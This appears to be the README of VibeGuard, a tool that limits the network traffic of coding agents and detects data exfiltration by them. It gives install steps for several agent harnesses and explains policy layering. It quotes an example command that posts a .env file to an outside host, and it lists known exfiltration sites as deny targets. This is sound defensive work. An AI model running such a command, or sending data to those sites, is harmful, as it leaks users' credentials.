# VibeGuard

Egress control for coding agents. One policy file, compiled into every
harness's native config and enforced at runtime by hooks where hooks exist.

It started as a set of plain-English permission cards for people who are not
developers. That layer is still here — every block still explains itself in a
sentence a non-engineer can act on — but the centre of gravity has moved to the
question security teams actually ask:

> Can you manage coding-agent domain allowlists programmatically, or block bad
> network requests, without allowlisting the entire internet?

## The model

```
                    policy/policy.json
                            │
        ┌───────────────────┼───────────────────┐
        │                   │                   │
   runtime hooks       compiled config     vendor consoles
   (judge each call)   (enforce ahead)     (flat domain lists)
        │                   │                   │
  Claude Code          Codex proxy         Devin, Cursor Cloud
  Cursor               Claude sandbox      Squid / mitm
```

Two things make this different from a domain allowlist:

**You do not allowlist the internet — you allowlist classes and deny sinks.**
`class:package-registries`, `class:vcs`, `class:docs` cover the traffic real
work generates. `class:exfil-sinks` covers where stolen data goes: webhook.site,
transfer.sh, pastebin, ngrok tunnels, Burp collaborator, Telegram bot API.
Everything else is `ask`, and `vg learn` turns a week of real asks into
allowlist entries you can justify.

**Intent beats destination.** The rule that catches the most is not a domain at
all — it is "this command reads a credential *and* opens a socket." That fires
on `curl -d @.env https://totally-legit-corp.com` even when the destination has
never been seen before and would otherwise be allowed.

## Install

**Claude Code** — strongest enforcement point. A `PreToolUse` hook can hard-deny.

```bash
node bin/vg.js sync --target claude --scope user --write     # hook + sandbox domains
node bin/vg.js sync --target claude --scope managed          # prints the MDM file + sudo cp line
```

Managed scope adds `allowManagedDomainsOnly`, `strictAllowlist`,
`failIfUnavailable` and `allowUnsandboxedCommands: false` — developers can no
longer widen the policy locally.

**Cursor** — hooks deny reliably; do not rely on them to *grant*.

```bash
node bin/vg.js sync --target cursor --write   # .cursor/hooks.json, committed to the repo
```

**Codex** — no pre-tool hook, so policy is compiled into the proxy config.

```bash
node bin/vg.js sync --target codex --write    # .codex/config.toml
```

**Hosted cloud agents (Devin, Cursor Cloud)** — no hook to hang policy on.

```bash
node bin/vg.js sync --target vendor --write   # flat allowlist.txt / denylist.txt
node bin/vg.js sync --target proxy --write    # squid.conf for a runner you control
```

Read [COVERAGE.md](COVERAGE.md) before promising any of this to a security
buyer. It says plainly where enforcement is real, where it is only detection,
and where it is nothing.

## Commands

```
vg check "<command>"           judge a command exactly as the hooks would
vg sync --target <t> --write   compile policy into harness config
vg allow <domain>              add to your policy layer
vg learn                       propose allowlist entries from observed traffic
vg coverage                    the honest per-harness matrix
vg test                        19-case policy suite
```

## Policy layering

Lowest to highest: bundled default → `~/.vibeguard/policy.json` →
`<repo>/.vibeguard/policy.json` → `$VIBEGUARD_POLICY`. Within a list, `deny`
beats `ask` beats `allow` regardless of which layer contributed it. A layer
removes an inherited entry with a leading `!`:

```json
{ "allow": ["api.stripe.com", "!class:crypto"], "deny": ["*.myrival.com"] }
```

## Unattended runs

An `ask` verdict is meaningless when nobody is watching. Set `VIBEGUARD_STRICT=1`
in cloud agents and background composers — every `ask` becomes a `deny`.

## Layout

```
policy/policy.json     the single source of truth
lib/policy.js          layering + destination matching
lib/extract.js         pulls destinations out of shell, URLs, MCP args
lib/decide.js          the verdicts and the plain-English cards
lib/render.js          policy → each harness's native config
lib/audit.js           append-only egress log, feeds `vg learn`
adapters/claude-code.js  PreToolUse
adapters/cursor.js       beforeShellExecution / beforeMCPExecution / beforeReadFile
bin/vg.js              CLI
```

Vendor config keys were verified against the July 2026 docs. `lib/render.js` is
the only file that changes when a vendor renames something.
